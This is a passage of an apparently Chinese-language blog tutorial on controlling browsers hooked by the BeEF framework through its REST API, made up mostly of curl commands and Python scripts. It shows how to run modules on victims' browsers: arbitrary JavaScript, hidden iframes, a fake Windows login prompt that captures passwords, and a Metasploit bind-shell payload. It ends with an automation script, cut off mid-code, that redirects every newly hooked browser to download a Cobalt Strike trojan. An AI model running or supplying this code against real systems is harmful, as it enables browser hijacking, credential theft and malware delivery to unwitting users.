operator">=</span>641640ae3ce89c4da45ee98de341f3e858f62bd3</code></pre><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170607225240137-118168632.png" alt="img"></p><p>返回了当前hook的主机情况，返回的json数据格式不太友好，作为测试，我们可以使用json代码格式化工具便于查看。</p><p>这里是一个不错的在线json编辑工具：<a href="http://tool.lu/json/" target="_blank" rel="noopener">http://tool.lu/json/</a>。我们也可以直接在浏览器中访问url，但是后文涉及提交某些必要的参数时，不能使用这种方式。</p><p>json代码经过格式化之后，我们可以看到，有两个主机上线。每个上线主机都有id号来表示身份。</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170607232844543-319859011.png" alt="img"></p><p><strong>session参数值是后面通过A{I调用执行beef模块时必须的参数，这个值你也可以在Web控制台的Cookie处找到。</strong></p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170612091121353-718229824.png" alt="img"></p><p>我们也可以通过脚本发送类似的请求实现这个获取这些信息，比如下面这个简单的示例代码</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding=utf-8 -*-</span><span class="token comment" spellcheck="true"># ** Author: ssooking</span><span class="token keyword">import</span> json<span class="token keyword">import</span> urllib2<span class="token keyword">def</span> <span class="token function">getHookedBrowsers</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>authkey<span class="token punctuation">)</span><span class="token punctuation">:</span>    f <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>host <span class="token operator">+</span> <span class="token string">"/api/hooks?token="</span> <span class="token operator">+</span> authkey<span class="token punctuation">)</span>    data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    hooked <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">"hooked-browsers"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"online"</span><span class="token punctuation">]</span>    <span class="token keyword">print</span> hooked    <span class="token keyword">return</span> hooked<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    host <span class="token operator">=</span> <span class="token string">"http://192.168.1.133:3000/"</span>    key <span class="token operator">=</span> <span class="token string">"e7170da7263c46d8e505ab044017707107a2ee6f"</span>    getHookedBrowsers<span class="token punctuation">(</span>host<span class="token punctuation">,</span>key<span class="token punctuation">)</span></code></pre><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608164630215-992078805.png" alt="img"></p><p><strong>如果你想知道某个被hook主机的详细信息，只要加上浏览器session值即可，它的请求格式应该是这样的</strong></p><pre class=" language-bash"><code class="language-bash">/api/hooks/浏览器session会话值?token<span class="token operator">=</span>xxxxxxxxxxxxxxx</code></pre><p>再来说说怎样调用模块，这部分功能是由/api/modules.rb控制的</p><h2 id="列举可调用的模块信息"><a href="#列举可调用的模块信息" class="headerlink" title="列举可调用的模块信息"></a>列举可调用的模块信息</h2><p>我们通过/api/modules接口列举出可以调用的模块</p><pre class=" language-bash"><code class="language-bash">curl http://192.168.1.133:3000/api/modules?token<span class="token operator">=</span>641640ae3ce89c4da45ee98de341f3e858f62bd3</code></pre><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170607233317356-1198715028.png" alt="img"></p><p>返回的格式不友好，我们直接在浏览器里访问</p><p> <img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170607233504997-672456143.png" alt="img"></p><p>我们可以发现，每一个模块都有对应的id号。我们在beef控制台里随便找一个，也可以找到这个id。但是需要注意一下，这个id号会因为你BeEF模块数目的不同有所变化，在编写代码之前你应该确认这个id号。</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170607233738497-1272039407.png" alt="img"></p><p> 　  <strong>如果你请求的格式像这样： /api/modules/130?token=xxxxx ， 即modules后面加上了具体的模块id号，那么可以得到这个模块的详细信息，比如需要的参数等</strong></p><p>　　所以，如果想要调用某个模块，我们只需要知道这个模块的id，并且在发送请求的的时候提供该模块需要的参数即可。</p><p>　　执行模块时请求的格式是这样的　/api/modules/:session/:module_id （session是被hook的浏览器会话，module_id即为beef模块的id号）</p><p>　　需要注意的是，提交参数时，Content-Type必须为json类型,字符集为 UTF-8，并且请求的主体内容必须是有效的json数据，这在后文有实例。</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608101313481-884146508.png" alt="img"></p><h2 id="执行BeEF模块"><a href="#执行BeEF模块" class="headerlink" title="执行BeEF模块"></a>执行BeEF模块</h2><p>　　举个调用例子。</p><p>　　这里使用一个简单的权限维持模块 Confirm Close Tab。这个模块的作用是，受害者在试图关闭选项卡时会向用户显示”关闭确认”对话框，通过这种方式来增加shell的存活时间。相关功能的模块还有 Man-In-The-Browser，Create Foreground iFrame，Create Pop Under。</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608100439372-44091558.png" alt="img"></p><p>我们可以看到，这个模块id为177，不需要提供其他参数，那么我们可以用curl模拟这种格式的请求来执行该模块</p><pre class=" language-bash"><code class="language-bash">curl -i -H <span class="token string">"Content-Type: application/json; charset=UTF-8"</span> -d <span class="token string">'{}'</span> http://xxxxx/api/modules/浏览器session/模块id?token<span class="token operator">=</span>xxxx</code></pre><p> <img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170617130113978-1457039164.png" alt="img"></p><p>虽然模块不需要额外的参数，但是因为请求主体必须为json格式，所以我们用 -d ‘{}’ 发送空数据。此时beef终端会有执行成功的提示。</p><p>如果你没有这个参数，就会报如图中 Invalid JSON input for module ‘177’  的错误</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608155910356-911539469.png" alt="img"></p><p> 在浏览器中验证，当我们点击关闭这个页面时，会弹出确认框，说明成功加载了这个模块。</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608155659825-677187987.png" alt="img"></p><p>同样的，我们可以编写脚本执行该模块</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding=utf-8 -*-</span><span class="token comment" spellcheck="true"># ** Author: ssooking</span><span class="token keyword">import</span> json<span class="token keyword">import</span> urllib2<span class="token keyword">def</span> <span class="token function">sendConfirm</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> sessionId<span class="token punctuation">,</span> authkey<span class="token punctuation">)</span><span class="token punctuation">:</span>    postdata <span class="token operator">=</span> <span class="token string">'{}'</span>    url <span class="token operator">=</span> host <span class="token operator">+</span> <span class="token string">"api/modules/"</span> <span class="token operator">+</span> sessionId <span class="token operator">+</span> <span class="token string">"/177?token="</span> <span class="token operator">+</span> authkey    <span class="token keyword">print</span> <span class="token string">"[+] URL: "</span> <span class="token operator">+</span> url    req <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span> postdata<span class="token punctuation">)</span>    req<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"application/json; charset=UTF-8"</span><span class="token punctuation">)</span>    f <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span>    <span class="token keyword">print</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    host <span class="token operator">=</span> <span class="token string">"http://192.168.1.133:3000/"</span>    sessionId <span class="token operator">=</span> <span class="token string">"tdipkyoT9fqMsMwrW6oc7esUX74rnuOffhe94T4u2DFRlAjhl5CN47gFikTjccC4YPetBtYhszOqb6MU"</span>    key <span class="token operator">=</span> <span class="token string">"e7170da7263c46d8e505ab044017707107a2ee6f"</span>    sendConfirm<span class="token punctuation">(</span>host<span class="token punctuation">,</span>sessionId<span class="token punctuation">,</span>key<span class="token punctuation">)</span></code></pre><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608165716747-1697948714.png" alt="img"></p><p> 来一个带参数的例子，这次我使用的是Raw JavaScript模块，这个模块允许我们在目标浏览器上执行javascript代码。注意，这些javascript代码不能经过特殊编码。</p><p> <img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170609150451340-776876082.png" alt="img"></p><p>这个模块的id号为169，我们再来看看它需要的参数，通过下面这样的请求获取模块详细信息</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170609151117465-1686660775.png" alt="img"></p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170615155020790-1640674329.png" alt="img"></p><p>需要提供的参数名为：”cmd”，参数内容是我们要执行的Javascript代码，我们可以用curl构造请求进行测试</p><pre class=" language-bash"><code class="language-bash">curl -i -H <span class="token string">"Content-Type: application/json; charset=UTF-8"</span> -d <span class="token string">'{"cmd":"alert(\ssooking\);"}'</span> http://192.168.1.133:3000/api/modules/ykH80KnJo0NGgTnRF04kwsE9cuXxI7JaxvBbH4diBxWvNrmYnTt99Vp5Bg8UjMb4rHgBQF08k5pFOLso/169?token<span class="token operator">=</span>dadd1be063d3a3b4339d84f5bdbbcbb25616b41d36a3b062697706d9f2d5</code></pre><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170615155422743-2018025793.png" alt="img"></p><p>因为不能用多个单引号，所以我用alert(/ssooking/)代替，但是没有弹出窗口，不过我使用自己编写的脚本执行这个模块就可以成功执行</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding=utf-8 -*-</span><span class="token comment" spellcheck="true"># ** Author: ssooking</span><span class="token keyword">import</span> json<span class="token keyword">import</span> urllib2<span class="token keyword">def</span> <span class="token function">execJavascript</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> sessionId<span class="token punctuation">,</span> authkey<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload<span class="token operator">=</span><span class="token punctuation">{</span>        <span class="token string">"cmd"</span><span class="token punctuation">:</span><span class="token string">"alert('Hello ssooking!');"</span>    <span class="token punctuation">}</span>    apiurl <span class="token operator">=</span> host <span class="token operator">+</span> <span class="token string">"api/modules/"</span> <span class="token operator">+</span> sessionId <span class="token operator">+</span> <span class="token string">"/169?token="</span> <span class="token operator">+</span> authkey    <span class="token keyword">print</span> <span class="token string">"[+] URL: "</span> <span class="token operator">+</span> apiurl    jdata <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>     req <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>apiurl<span class="token punctuation">,</span> jdata<span class="token punctuation">)</span>     req<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"application/json; charset=UTF-8"</span><span class="token punctuation">)</span>    response <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span>      resdata <span class="token operator">=</span> response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>                     <span class="token keyword">return</span> resdata<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    host <span class="token operator">=</span> <span class="token string">"http://192.168.1.133:3000/"</span>    sessionId <span class="token operator">=</span> <span class="token string">"ykH80KnJo0NGgTnRF04kwsE9cuXxI7JaxvBbH4diBxWvNrmYnTt99Vp5Bg8UjMb4rHgBQF08k5pFOLso"</span>    key <span class="token operator">=</span> <span class="token string">"dadd1be063d3a3b4339d84f5bdbbcbb25616b41d"</span>    <span class="token keyword">print</span> execJavascript<span class="token punctuation">(</span>host<span class="token punctuation">,</span>sessionId<span class="token punctuation">,</span>key<span class="token punctuation">)</span></code></pre><p> <img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170615155834290-1948404420.png" alt="img"></p><p>弹出了窗口</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170615155804853-1359816839.png" alt="img"></p><p>再举个带参数的例子，这次我使用的是Create Invisible Iframe模块，它的功能是创建一个隐藏的Frame。</p><p>这个模块的id为174，需要的参数是隐藏的Frame所指向的url地址</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608190416903-771897904.png" alt="img"></p><p>先查看一下模块的详细参数</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608191702309-1914275279.png" alt="img"></p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170615153958915-885891081.png" alt="img"></p><p>可以看到，这个请求的这个url参数名为”target”。下面进行测试，我们使用python创建一个简单的HTTP服务器</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608192353684-2054230154.png" alt="img"></p><p>我们用curl构造请求</p><pre class=" language-bash"><code class="language-bash">curl -i -H <span class="token string">"Content-Type: application/json; charset=UTF-8"</span> -d <span class="token string">'{"target":"http://192.168.1.133:8000/"}'</span> http://192.168.1.133:3000/api/modules/tdipkyoT9fqMsMwrW6oc7esUX74rnuOffhe94T4u2DFRlAjhl5CN47gFikTjccC4YPetBtYhszOqb6MU/174?token<span class="token operator">=</span>32c75b5e91ef4e519da119349d2c0cbd7cd23259</code></pre><p>执行成功，python HTTP上成功回显，说明我们在目标的浏览器上创建了一个隐藏的iframe，并使其访问了这个url地址</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608223339903-90503676.png" alt="img"></p><p> <img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170615154145259-431225205.png" alt="img"></p><h2 id="获取模块执行结果"><a href="#获取模块执行结果" class="headerlink" title="获取模块执行结果"></a>获取模块执行结果</h2><p>有些模块执行完毕后，我们需要获取返回的数据，比如凭证欺骗模块Pretty Theft，我们想要获取用户输入的认证口令。</p><p>我们使用一个简单的windows凭证认证模板</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170609162357934-1487342041.png" alt="img"></p><p>这时候目标浏览器上会弹出认证框</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170609161931012-1900384378.png" alt="img"></p><p>模拟提交了凭证之后，从beef的执行结果中，我们可以看到欺骗到的密码</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170609162133403-1950800768.png" alt="img"></p><p>下面就通过API调用执行该模块，先看下参数</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170615160147759-668975630.png" alt="img"></p><p>查看模块详细信息，我们可以知道，需要设置的参数有：欺骗对话框类型”choice”，背景风格”backing”，Logo的图片地址”imgsauce” ，因此请求示例应该像这样：</p><pre class=" language-bash"><code class="language-bash">curl -i -H <span class="token string">"Content-Type: application/json; charset=UTF-8"</span> -d <span class="token string">'{"choice":"Windows","backing":"Grey","imgsauce":"http://0.0.0.0:3000/ui/media/images/beef.png"}'</span> http://192.168.1.133:3000/api/modules/ykH80KnJo0NGgTnRF04kwsE9cuXxI7JaxvBbH4diBxWvNrmYnTt99Vp5Bg8UjMb4rHgBQF08k5pFOLso/117?token<span class="token operator">=</span>dadd1be063d3a3b4339d84f5bdbbcbb25616b41d</code></pre><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170615160851853-202353993.png" alt="img"></p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170615160749431-930877960.png" alt="img"></p><p>　　</p><p>执行成功，并且返回了模块执行的id为35。假设我们提交的口令是：test333/123456</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170614001556040-491212835.png" alt="img"></p><p>我们想要获取受害者提供的这些认证信息，这时候，我们需要这样请求：</p><pre class=" language-bash"><code class="language-bash">/api/modules/浏览器session/模块id/command_id？token<span class="token operator">=</span>xxx</code></pre><p> 比如</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170615161100837-1887025062.png" alt="img"></p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170615161120290-855046422.png" alt="img">  </p><h2 id="Beef与metasploit联用"><a href="#Beef与metasploit联用" class="headerlink" title="Beef与metasploit联用"></a>Beef与metasploit联用</h2><p>　　我们当然不能忘记了metasploit这个神器。Beef与metasploit联用，实在是个大杀器。要想在beef加载metasploit，我们首先需要修改默认的配置文件，修改beef下<code>config.yaml</code>文件</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608170549684-1233972575.png" alt="img"></p><p>把启用<code>metasploit</code>这个选项值改成<code>true</code></p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608170832622-145925591.png" alt="img"></p><p>另外,如果你的metasploit安装位置不包含在默认路径里，需要在<code>beef-xss/extensions/metasploit/config.yaml</code>的文件里设置一下</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608171240090-406564106.png" alt="img"></p><p>然后我们启动msf加载<code>msgrpc</code></p><pre class=" language-bash"><code class="language-bash">msfconsole -x <span class="token string">"load msgrpc ServerHost=127.0.0.1 Pass=abc123"</span></code></pre><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608171842528-1564566798.png" alt="img"></p><p>重启beef即可加载metasploit模块</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608172313700-431421692.png" alt="img"></p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608172818497-792530133.png" alt="img"></p><p>　　同样的，如果你想调用Metasploit模块，步骤与前面的都一样，先查看改模块的id所需参数等信息，然后构造请求调用这个模块即可，关于metasploit模块调用，因为过两天就要考试了，没有时间做测试，有兴趣的朋友可以试一试。这个是 BeEF-RESTful-API的上一个请求示例。</p><pre class=" language-bash"><code class="language-bash">curl -H <span class="token string">"Content-Type: application/json; charset=UTF-8"</span> -d <span class="token string">'{"SRVPORT":"3992", "URIPATH":"77345345345dg", "PAYLOAD":"generic/shell_bind_tcp"}'</span> -X POST http://xxxx/api/modules/浏览器session?token<span class="token operator">=</span>xxx</code></pre><h1 id="三-编写自动化控制脚本"><a href="#三-编写自动化控制脚本" class="headerlink" title="三. 编写自动化控制脚本"></a>三. 编写自动化控制脚本</h1><p>　　下面我尝试编写一个简单的自动控制hook主机的脚本，批量执行我提前设定的一些模块。我的思路是定时获取hook主机的session信息 ，存放到一个字典里，如果有新上线的僵尸主机的浏览器session，我们就通过API控制这个浏览器执行我们设定好的Beef模块，并把这个session添加到一个列表里，表示已经执行过。如果检测到某个session已经存在于列表中，说明已经执行过，就不再执行。测试的代码中，我用到了三个模块：Confirm Close Tab，Raw Javascript，Redirect Browser。第一个模块用于增加shell存活时间，第二个模块用于执行javascript代码，第三个模块使浏览器进行跳转下载，我把这个跳转地址指向一个Cobalt Strike生成的测试木马，并模拟受害者自动下载并运行恶意软件。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># ** Author: ssooking</span><span class="token comment" spellcheck="true"># ** Name： AutoBeef.py</span><span class="token keyword">import</span> json<span class="token keyword">import</span> urllib2<span class="token keyword">import</span> timehostlist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>hostdict <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">def</span> <span class="token function">getauthkey</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token punctuation">:</span>    apiurl <span class="token operator">=</span>  host <span class="token operator">+</span> <span class="token string">"api/admin/login"</span>    logindata <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">"beef"</span><span class="token punctuation">,</span>        <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"beef"</span>    <span class="token punctuation">}</span>    jdata <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>logindata<span class="token punctuation">)</span>             <span class="token comment" spellcheck="true"># 对数据进行JSON格式化编码</span>    req <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>apiurl<span class="token punctuation">,</span> jdata<span class="token punctuation">)</span>      <span class="token comment" spellcheck="true"># 生成页面请求的完整数据</span>    response <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span>           <span class="token comment" spellcheck="true"># 发送页面请求</span>    resdata <span class="token operator">=</span> response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>                 <span class="token comment" spellcheck="true"># 获取服务器返回的页面信息，数据类型为str</span>    jsondata <span class="token operator">=</span>  json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>resdata<span class="token punctuation">)</span>           <span class="token comment" spellcheck="true"># 把数据解析成python对象，此时返回dict数据</span>    <span class="token keyword">return</span> jsondata<span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">getHookedBrowsersSession</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>authkey<span class="token punctuation">)</span><span class="token punctuation">:</span>    f <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>host <span class="token operator">+</span> <span class="token string">"/api/hooks?token="</span> <span class="token operator">+</span> authkey<span class="token punctuation">)</span>    data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    hookonline <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">'hooked-browsers'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'online'</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> hookonline<span class="token punctuation">:</span>        hookid <span class="token operator">=</span> hookonline<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span>        hookip <span class="token operator">=</span> hookonline<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span>        hooksession <span class="token operator">=</span> hookonline<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'session'</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> hookid <span class="token operator">not</span> <span class="token keyword">in</span> hostdict<span class="token punctuation">:</span>            hostdict<span class="token punctuation">[</span>hookid<span class="token punctuation">]</span> <span class="token operator">=</span> hooksession            <span class="token keyword">print</span> <span class="token string">"\n[+] Hooked host id:  "</span> <span class="token operator">+</span> bytes<span class="token punctuation">(</span>hookid<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n   >>> IP: "</span> <span class="token operator">+</span> bytes<span class="token punctuation">(</span>hookip<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n   >>> Session: "</span> <span class="token operator">+</span> hooksession<span class="token keyword">def</span> <span class="token function">sendConfirm</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> session<span class="token punctuation">,</span> authkey<span class="token punctuation">)</span><span class="token punctuation">:</span>    postdata <span class="token operator">=</span> <span class="token string">'{}'</span>    url <span class="token operator">=</span> host <span class="token operator">+</span> <span class="token string">"api/modules/"</span> <span class="token operator">+</span> session <span class="token operator">+</span> <span class="token string">"/177?token="</span> <span class="token operator">+</span> authkey    <span class="token comment" spellcheck="true">#print url</span>    req <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span> postdata<span class="token punctuation">)</span>    req<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"application/json; charset=UTF-8"</span><span class="token punctuation">)</span>    f <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"   >>> [+] Module Confirm Close Tab has been Executed ! "</span>    <span class="token keyword">return</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">execJavascript</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> session<span class="token punctuation">,</span> authkey<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload<span class="token operator">=</span><span class="token punctuation">{</span>        <span class="token string">"cmd"</span><span class="token punctuation">:</span><span class="token string">"alert('Hello by ssooking!');"</span>    <span class="token punctuation">}</span>    apiurl <span class="token operator">=</span> host <span class="token operator">+</span> <span class="token string">"api/modules/"</span> <span class="token operator">+</span> session <span class="token operator">+</span> <span class="token string">"/169?token="</span> <span class="token operator">+</span> authkey    jdata <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    req <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>apiurl<span class="token punctuation">,</span> jdata<span class="token punctuation">)</span>    req<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"application/json; charset=UTF-8"</span><span class="token punctuation">)</span>    response <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span>    resdata <span class="token operator">=</span> response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"   >>> [+] Module Raw JavaScript has been Executed ! "</span>    <span class="token keyword">return</span> resdata<span class="token keyword">def</span> <span class="token function">redirectBrowser</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> session<span class="token punctuation">,</span> authkey<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"redirect_url"</span><span class="token punctuation">:</span><span class="token string">"http://192.168.1.133:8000/plugins.exe"</span><span class="token punctuation">}</span>    apiurl <span class="token operator">=</span> host <span class="token operator">+</span> <span class="token string">"api/modules/"</span> <span class="token operator">+</span> session <span class="token operator">+</span> <span class="token string">"/42?token="</span> <span class="token operator">+</span> authkey    jdata <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    req <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>apiurl<span class="token punctuation">,</span> jdata<span class="token punctuation">)</span>    req<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"application/json; charset=UTF-8"</span><span class="token punctuation">)</span>    response <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span>    resdata <span class="token operator">=</span> response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    jsondata <span class="token operator">=</span>  json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>resdata<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"   >>> [+] Module Redirect Browser has been Executed ! "</span>    <span class="token keyword">return</span> jsondata<span class="token keyword">def</span> <span class="token function">createIFrame</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> sessionId<span class="token punctuation">,</span> authkey<span class="token punctuation">)</span><span class="token punctuation">:</span>    postdata <span class="token operator">=</span> <span class="token string">'{"target":"http://192.168.1.133:8000/"}'</span>    url <span class="token operator">=</span> host <span class="token operator">+</span> <span class="token string">"api/modules/"</span> <span class="token operator">+</span> sessionId <span class="token operator">+</span> <span class="token string">"/174?token="</span> <span class="token operator">+</span> authkey    req <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span> postdata<span class="token punctuation">)</span>    req<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"application/json; charset=UTF-8"</span><span class="token punctuation">)</span>    f <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"   >>> [+] Module Create Invisible Iframe has been Executed ! "</span>    <span class="token keyword">return</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">autoRunModules</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>session<span class="token punctuation">,</span>authkey<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#sendConfirm(host, session, authkey)</span>    <span class="token comment" spellcheck="true">#execJavascript(host, session, authkey)</span>    redirectBrowser<span class="token punctuation">(</span>host<span class="token punctuation">,</span> session<span class="token punctuation">,</span> authkey<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">timeRun</span><span class="token punctuation">(</span>interval<span class="token punctuation">,</span>host<span class="token punctuation">)</span><span class="token punctuation">:</span>    authkey <span class="token operator">=</span> getauthkey<span class="token punctuation">(</span>host<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"[+] AutoBeef is running...."</span>    <span class="token keyword">print</span> <span class="token string">"[+] BeEF KEY is : "</span><span class="token 